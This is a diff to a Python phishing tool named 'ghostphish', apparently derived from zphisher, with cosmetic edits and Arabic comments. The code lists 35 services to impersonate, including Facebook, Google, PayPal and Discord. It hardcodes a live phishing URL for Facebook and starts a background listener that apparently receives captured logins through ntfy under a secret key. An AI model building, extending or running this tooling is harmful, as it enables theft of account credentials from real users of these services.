@@ -19,20 +19,21 @@ RESET = '\033[0m'
 
 CONFIG_FILE = "ghostphish_config.json"
 
+# ─── الأسماء المعدلة (حذف الزوائد) ───
 PLATFORMS = {
     1: "Facebook", 2: "Instagram", 3: "Google", 4: "Microsoft", 5: "Netflix",
-    6: "Paypal", 7: "Steam", 8: "Twitter", 9: "Playstation", 10: "Tiktok",
+    6: "Paypal", 7: "Steam", 8: "Twitter", 9: "Playstation", 10: "Tok",        # حذف Tik
     11: "Twitch", 12: "Pinterest", 13: "Snapchat", 14: "LinkedIn", 15: "Ebay",
     16: "Quora", 17: "Protonmail", 18: "Spotify", 19: "Reddit", 20: "Adobe",
     21: "DeviantArt", 22: "Badoo", 23: "Origin", 24: "DropBox", 25: "Yahoo",
-    26: "Wordpress", 27: "Yandex", 28: "StackoverFlow", 29: "Vk", 30: "XBOX",
+    26: "Wordpress", 27: "Yandex", 28: "Stackover", 29: "Vk", 30: "XBOX",     # حذف Flow
     31: "Mediafire", 32: "Gitlab", 33: "Github", 34: "Discord", 35: "Roblox"
 }
 
 LINKS = {i: "" for i in range(1, 36)}
 LINKS[1] = "https://facebook-vjj9.onrender.com"
 
-COL_WIDTH = 26
+COL_WIDTH = 26  # عرض ثابت لكل عمود لضمان الاستقامة الأفقية
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -64,7 +65,6 @@ def print_banner():
 \____/\___/\____/____/\__/_/   /_/ /_/_/____/_/ /_/
 {RESET}"""
     print(banner)
-    # أسطر فارغة بين الأقسام العلوية (حسب طلبك)
     print()
     print(WHITE + "General : 1.0" + RESET)
     print(WHITE + "[–] Tool Created by htr-tech (tahmid.rayat)" + RESET)
@@ -74,7 +74,7 @@ def print_banner():
     print()
 
 def print_menu():
-    # قائمة المنصات: أسطر متلاصقة بدون أي سطر فارغ بينها (مسافة عمودية ضيقة جداً)
+    # القائمة مضغوطة عمودياً: كل سطر يليه مباشرة دون أي مسافة فارغة
     for i in range(1, 11):
         col1 = fmt_entry(i, PLATFORMS[i])
         col2 = fmt_entry(i + 10, PLATFORMS[i + 10])
@@ -125,7 +125,7 @@ def main():
     clear_screen()
     print_banner()
     print(f"{WHITE}🔑 مفتاحك السري: {ORANGE}{secret}{RESET}")
-    print()  # سطر فارغ قبل القائمة (مسافة بين المفتاح والقائمة)
+    print()  # سطر فارغ واحد فقط قبل القائمة
     threading.Thread(target=listen_ntfy, args=(secret,), daemon=True).start()
     time.sleep(1)
 
